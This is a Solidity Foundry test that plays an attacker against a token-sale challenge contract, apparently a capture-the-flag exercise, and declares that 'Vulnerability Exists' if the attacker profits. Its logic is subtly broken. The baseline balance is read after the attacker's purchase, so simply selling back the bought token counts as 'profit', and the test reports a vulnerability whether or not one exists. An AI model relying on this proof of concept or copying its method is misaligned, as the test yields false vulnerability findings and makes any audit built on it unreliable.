// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/tokensalechallenge.sol";

contract TokenSaleTest is Test {
    TokenSaleChallenge tokenSale;
    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");
    uint256 public constant INITIAL_BALANCE = 10 ether;

    function setUp() public {
        // Fund deployer wallet
        vm.deal(deployer, INITIAL_BALANCE);

        // Deploy contract as deployer with initial 1 ETH
        vm.prank(deployer);
        tokenSale = new TokenSaleChallenge{value: 1 ether}(address(this));
        
        // Fund attacker wallet
        vm.deal(attacker, 1 ether);
    }

    function test_arbitrary_sender_can_withdraw_ether() public {
        vm.startPrank(attacker);
        
        // Attacker purchases 1 token (assume PRICE_PER_TOKEN = 1 ether)
        tokenSale.buy{value: 1 ether}(1);
        
        // Get attacker's balance before exploitation
        console2.log("--- BEFORE-Trigger ---");
        uint256 attackerBalancePre = attacker.balance;
        console2.log("Attacker BAL Pre:  %e ETH", attackerBalancePre);

        console2.log("--- Trigger ---");
        // Attack: sell tokens to withdraw Ether
        tokenSale.sell(1);

        console2.log("--- AFTER-Trigger ---");
        uint256 attackerBalancePost = attacker.balance;
        console2.log("Attacker BAL Post: %e ETH", attackerBalancePost);

        // Calculate profit
        uint256 profit = attackerBalancePost - attackerBalancePre;
        console2.log(">>> Verdict: %e ETH profit computed", profit);

        // Final vulnerability verdict
        if (profit > 0) {
            console2.log("Vulnerability Exists: Attacker extracted %e ETH profit from contract", profit);
        } else {
            console2.log("Vulnerability not Exist: No ETH was extracted from contract");
        }
        
        vm.stopPrank();
        
        // Maintain original verification logic
        assertGt(
            attackerBalancePost, 
            attackerBalancePre, 
            "Attacker should profit from extracting Ether"
        );
    }
}